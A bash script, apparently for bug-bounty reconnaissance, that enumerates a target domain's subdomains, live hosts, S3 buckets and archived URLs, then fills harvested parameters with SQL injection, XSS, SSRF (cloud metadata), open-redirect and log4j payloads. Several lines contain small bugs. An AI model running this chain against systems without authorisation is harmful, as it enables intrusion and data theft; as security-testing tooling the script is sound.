#/bin/bash

while getopts ":d:" input;do
    case "$input" in 
            d) domain=${OPTARG}
                    ;;
            esac 
    done        
if [ -z "$domain" ]
        then
                echo "please give a domain like \"-d domain.com\""
                exit 1 
fi



host $domain | anew hostinfo.txt 
dig $domain any | anew diginfo.txt
subfinder -d $domain -o op.txt
assetfinder --subs-only $domain | anew op.txt


amass enum -passive -d $domain | anew op.txt
amass enum -active -d $domain | anew amass_ips.txt
crobat -s $domain | anew amass_ips.txt
cat amass_ips.txt | awk '{print $1}' | anew op.txt

cat op.txt | sort -u | anew all.txt 
cat all.txt | httprobe | anew alive2.txt
cat alive2.txt | sort -u | anew alive.txt

echo "checing for sub-domain TakeOver"
subzy -targets all.txt -hide_fails | anew SubdomainTakeover.txt

echo "finding parameter and Next scan for xss"
for i in $(cat all.txt);do ./tools/ParamSpider/paramspider.py -d $i ;done 
cat output/*.txt | sort -u | anew paramspideroutput.txt

echo "starting Cms Detection"
whatweb -i alive.txt | anew whatweb_op.txt 

echo "AWS s3 checking" 
for i in $(cat op.txt);do aws s3 ls s3://$1 --no-sign-request --region us-west-2 ;done| anew Awsmischeck.txt

cd /root/tools/dirsearch
./dirsearch.py -u $domain | anew ../../dirseaechfuzz.txt

cd

echo "GF patterns scan" 
mkdir gfpatternsscan

cat alive.txt | waybackurls | sort -u >> waybackdata
cat waybackdata | gf redirect | anew gfpatternsscan/redirectGF.txt 
cat waybackdata | gf xss | anew gfpatternsscan/xssGF.txt
cat waybackdata | gf ssti | anew gfpatternsscan/sstiGF.txt
cat waybackdata | gf sqli | anew gfpatternsscan/sqliGF.txt
cat waybackdata | gf rce |  anew gfpatternsscan/rceGF.txt
cat waybackdata | gf lif | anew gfpatternsscan/lfiGF.txt
cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt 


   
cat gfpatternsscan/xssGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q xss.txt
cat gfpatternsscan/lfiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q lfi.list
cat gfpatternsscan/rceGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q Vrce.list
cat gfpatternsscan/ssrfparamsGF.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" | anew -q Vssrf.list
cat gfpatternsscan/sstiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q Vssti.list
cat gfpatternsscan/sqliGF.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" | anew -q Vsqli.list
cat gfpatternsscan/redirectGF.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" | anew -q Vredirect.list

 xargs -a gfpatternsscan/xssGF.txt -P 30 -I % bash -c "echo % | kxss" | grep "< >\|\"" | anew -q xss.list
 cat xss.list | bhedak "\">/><svg/onload=confirm(document.domain)>" | anew -q Vxss.txt


echo "log4jscan but you need to enter burp server" 

root/tools/log4j-RCE-Scanner/./log4j-rce-scanner.sh -l alive -b $burp | anew log4jscan.txt


mkdir wayback_data 
cd wayback_data 
for i in $(cat ../all.txt);do echo $i | waybackurls ;done | anew wb.txt
cat wb.txt | sort -u | grep "=" | anew paramlist.txt

cat wb.txt | grep -p "\w+\.js(\?|$)" | sort -u | anew jsurls.txt

cat wb.txt | grep -p "\w+\.php(\?|$)" | sort -u | anew phpurls.txt

cat wb.txt | grep -p "\w+\.aspx(\?|$)" | sort -u | anew aspxurls.txt

cat wb.txt | grep -p "\w+\.jsp(\?|$)" | sort -u | anew jspurls.txt

cat wb.txt | grep -p "\w+\.txt(\?|$)" | sort -u | anew robots.txt

cd ..











































